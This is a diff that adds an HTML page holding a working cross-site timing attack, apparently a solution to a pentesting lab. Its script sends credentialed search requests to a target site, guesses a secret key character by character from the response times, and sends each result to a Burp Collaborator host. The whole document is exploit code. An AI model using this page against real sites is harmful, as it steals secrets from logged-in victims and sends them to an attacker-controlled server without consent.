@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <ul id="secrets"></ul>
+
+<script>
+
+    function sendKey(k)
+    {
+        console.log("sendKey:"+k)
+        try {
+            x = new XMLHttpRequest();
+            x.open("GET","http://qqkxpek9c8g1z17v3kas595rqiw8kx.burpcollaborator.net?key="+k, false);
+            x.send();
+        } catch(e) {
+                console.log("BB"+e);
+        }
+    };
+    sendKey("Started")
+    key = ""
+    while (key.length < 3) {
+        chars="0123456789-abcdef"
+        bFound=false
+        for (var i = 0; i < chars.length; i++) {
+            char = chars.charAt(i)
+            tk = key+char
+            let before = performance.now()
+
+            try {
+                x = new XMLHttpRequest();
+                x.open("GET","http://ptl-ff8dcea2-d4247c35.libcurl.so/search?search=%5e"+tk, false);
+                x.withCredentials = true;
+                x.send();
+            }
+            catch(e) {
+                console.log("BB"+e);
+            }
+            let request_time = performance.now() - before
+            console.log("tk:"+tk+":"+request_time)
+            if (request_time > 3300) {
+                sendKey("rt:"+request_time+" INT:"+tk)
+                key=tk
+                i=chars.length+1
+                bFound=true
+            }
+        }
+        if (bFound == false) {
+            break
+        }
+    }
+    sendKey("finished:"+key)
+
+
+</script>
+  </body>
+</html>
